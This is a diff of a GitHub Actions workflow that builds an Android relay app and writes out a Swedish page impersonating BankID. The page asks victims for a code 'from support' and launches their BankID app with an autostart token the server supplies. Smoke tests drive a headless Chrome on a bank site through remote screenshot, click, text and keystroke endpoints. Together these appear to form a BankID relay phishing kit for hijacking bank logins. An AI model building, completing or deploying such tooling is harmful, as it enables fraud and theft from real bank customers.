+                border:2px solid #cbd5e0;border-radius:10px;text-transform:uppercase;margin:10px 0}
+          button{font-size:17px;padding:12px 22px;border:0;border-radius:10px;background:#0b5cab;color:#fff;width:80%}
+          .fel{background:#fed7d7;color:#822727;border-radius:8px;padding:10px;font-size:14px;margin-bottom:10px}
+          .spinner{width:44px;height:44px;border:4px solid #cbd5e0;border-top-color:#0b5cab;
+                   border-radius:50%;margin:14px auto;animation:sn 1s linear infinite}
+          @keyframes sn{to{transform:rotate(360deg)}}
+          </style></head>
+          <body><div id="box">
+            <h1>BankID</h1>
+            <div id="fel" class="fel" style="display:none"></div>
+            <div id="start">
+              <p>Skriv koden du fick av supporten:</p>
+              <input id="kod" maxlength="5" autocapitalize="characters" placeholder="XXXXX">
+              <button id="ok">FORTSATT</button>
+            </div>
+            <div id="vanta" style="display:none"><div class="spinner"></div><p id="txt">Vantar...</p></div>
           </div>
           <script>
-          var code = location.pathname.split('/').pop();
-          var b = document.getElementById('b');
-          var h = document.getElementById('h');
-          var t = document.getElementById('t');
-          var sp = document.getElementById('sp');
-          var ok = document.getElementById('ok');
-          var lastTok = '';
-          var timer = null;
-          var fel = 0;
-
-          function klart() {
-            clearInterval(timer);
-            sp.style.display = 'none';
-            b.style.display = 'none';
-            ok.textContent = 'OK';
-            h.textContent = 'Klart!';
-            t.textContent = 'Din signering ar klar. Du kan stanga sidan.';
-          }
-
-          function poll() {
-            fetch('/api/session/' + code + '/state').then(function(r){return r.json()}).then(function(s){
-              if (!s.ok) {
-                fel++;
-                if (fel > 3) {
-                  sp.style.display = 'none';
-                  h.textContent = 'Sessionen hittades inte';
-                  t.textContent = 'Be om en ny lank.';
+          var S={code:'',oppnad:false};
+          function q(n){return new URLSearchParams(location.search).get(n);}
+          function visa(id){['start','vanta'].forEach(function(x){document.getElementById(x).style.display=(x===id?'block':'none');});}
+          function fel(t){var e=document.getElementById('fel');e.textContent=t;e.style.display='block';}
+          async function varva(){
+            try{
+              var r=await fetch('/api/poll?code='+encodeURIComponent(S.code)+'&t='+Date.now());
+              if(!r.ok){fel('Sessionen finns inte langre.');}
+              else{
+                var d=await r.json();
+                if(d.signed)document.getElementById('txt').textContent='Klart! Du kan lagga ner.';
+                if(d.token&&!S.oppnad){
+                  S.oppnad=true;
+                  document.getElementById('txt').textContent='Oppnar BankID...';
+                  location.href='bankid:///?autostarttoken='+encodeURIComponent(d.token)+'&redirect=null';
+                  return;
                 }
-                return;
               }
-              fel = 0;
-              if (s.signed) { klart(); return; }
-              if (s.token && s.token !== lastTok) {
-                lastTok = s.token;
-                b.className = 'live';
-                b.href = 'bankid:///?autostarttoken=' + s.token + '&redirect=' +
-                  encodeURIComponent(location.protocol + '//' + location.host + '/api/signed?code=' + code);
-                b.innerHTML = 'TRYCK HAR<small>' + s.ttl + ' s</small>';
-                clearInterval(timer);
-                var left = s.ttl;
-                timer = setInterval(function(){
-                  left--;
-                  var sm = b.querySelector('small');
-                  if (left <= 0) {
-                    clearInterval(timer);
-                    b.className = '';
-                    b.innerHTML = 'Vantar...<small>Token har gatt ut</small>';
-                  } else if (sm) {
-                    sm.textContent = left + ' s';
-                  }
-                }, 1000);
-              }
-            }).catch(function(){});
+            }catch(e){fel('Tappade kontakten med servern.');}
+            setTimeout(varva,1500);
           }
-          setInterval(poll, 800);
-          poll();
+          document.getElementById('ok').onclick=function(){
+            var k=(document.getElementById('kod').value||'').toUpperCase().replace(/[^A-Z0-9]/g,'');
+            if(k.length<4){fel('Koden ar for kort.');return;}
+            S.code=k;visa('vanta');varva();
+          };
+          (function(){var k=(q('code')||'').toUpperCase();if(k){document.getElementById('kod').value=k;S.code=k;visa('vanta');varva();}})();
           </script>
-          </body>
-          </html>
+          </body></html>
           EOF
 
-          echo klart
+          chmod +x server/chrome.sh server/start.sh
 
-      - name: bygg
+      - uses: actions/setup-java@v4
+        with:
+          distribution: temurin
+          java-version: '17'
+
+      - uses: android-actions/setup-android@v3
+        with:
+          packages: 'platforms;android-34 build-tools;34.0.0 platform-tools'
+          accept-android-licenses: true
+
+      - uses: gradle/actions/setup-gradle@v4
+        with:
+          gradle-version: '8.7'
+
+      - name: Kolla serverns syntax
+        run: node --check server/server.js
+
+      - name: Installera node-beroenden
+        run: npm install --prefix server --no-audit --no-fund
+
+      - name: Starta Chrome och servern, roektests
         run: |
-          set +e
-          yes | sdkmanager --licenses > /dev/null 2>&1
-          sdkmanager "platforms;android-34" "build-tools;34.0.0" "platform-tools" > /dev/null 2>&1
-          gradle assembleDebug --no-daemon --stacktrace > bygg.log 2>&1
-          RC=$?
-          grep -n "^e:" bygg.log || true
-          tail -n 30 bygg.log
-          if [ "$RC" != "0" ]; then exit "$RC"; fi
-          test -f app/build/outputs/apk/debug/app-debug.apk
+          google-chrome --headless=new --no-sandbox --disable-gpu --disable-dev-shm-usage \
+            --remote-debugging-port=9222 '--remote-allow-origins=*' \
+            --user-data-dir=/tmp/cprof about:blank > /tmp/chrome.log 2>&1 &
+          sleep 6
+          curl -sf http://127.0.0.1:9222/json/version | head -c 90
+          echo ""
+          node server/server.js &
+          SRV=$!
+          sleep 3
+          curl -sf http://localhost:3000/
+          echo ""
+          CODE=$(curl -sf -X POST -H 'Content-Type: application/json' \
+            -d '{"bank":"about:blank"}' http://localhost:3000/api/kor \
+            | node -e "let d='';process.stdin.on('data',c=>d+=c).on('end',()=>process.stdout.write(JSON.parse(d).code))")
+          echo "session=$CODE"
+          test ${#CODE} -eq 5
+          sleep 2
+          curl -sf http://localhost:3000/api/skarm | node -e "
+            let d='';process.stdin.on('data',c=>d+=c).on('end',()=>{
+              const j=JSON.parse(d);
+              console.log('skarm ok='+j.ok+' bytes='+((j.bild||'').length));
+              if(!j.ok) process.exit(1);
+            });"
+          curl -sf -X POST -H 'Content-Type: application/json' -d '{"x":50,"y":50}' \
+            http://localhost:3000/api/peka
+          curl -sf -X POST -H 'Content-Type: application/json' -d '{"t":"hej"}' \
+            http://localhost:3000/api/text
+          curl -sf -X POST -H 'Content-Type: application/json' -d '{"k":"enter"}' \
+            http://localhost:3000/api/tangent
+          curl -sf -X POST -H 'Content-Type: application/json' \
+            -d "{\"code\":\"$CODE\",\"token\":\"TESTTOKEN123\"}" http://localhost:3000/api/token
+          H=$(curl -s -D - -o /dev/null "http://localhost:3000/b?code=$CODE")
+          echo "$H" | grep -q '303'
+          echo "$H" | grep -qi 'bankid://'
+          curl -sf -X POST -H 'Content-Type: application/json' -d "{\"code\":\"$CODE\"}" \
+            http://localhost:3000/api/signed
+          curl -sf "http://localhost:3000/api/state?code=$CODE" | grep -q '"signed":true'
+          kill $SRV
+          echo "ALLT OK - chrome-drivrutin, skarm, peka, tangent, 303-lank"
 
-      - name: upload
-        if: always()
+      - name: Bygg APK
+        run: gradle :app:assembleDebug --no-daemon --stacktrace
+
+      - name: Kontrollera APK
+        run: |
+          test -f app/build/outputs/apk/debug/app-debug.apk
+          ls -lh app/build/outputs/apk/debug/app-debug.apk
+
+      - name: Ladda upp APK
         uses: actions/upload-artifact@v4
         with:
-          name: relay-apk
+          name: relay-apk-2.0.0
           path: app/build/outputs/apk/debug/app-debug.apk
-
-      - name: release
-        uses: softprops/action-gh-release@v2
-        with:
-          tag_name: v1.1.${{ github.run_number }}
-          name: Relay 1.1.${{ github.run_number }}
-          files: app/build/outputs/apk/debug/app-debug.apk
-        env:
-          GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
-
-      - name: spara
-        if: always()
-        run: |
-          git config user.name bot
-          git config user.email bot@example.com
-          git add -A
-          git commit -m "scaffold" || true
-          git push || true
+          if-no-files-found: error
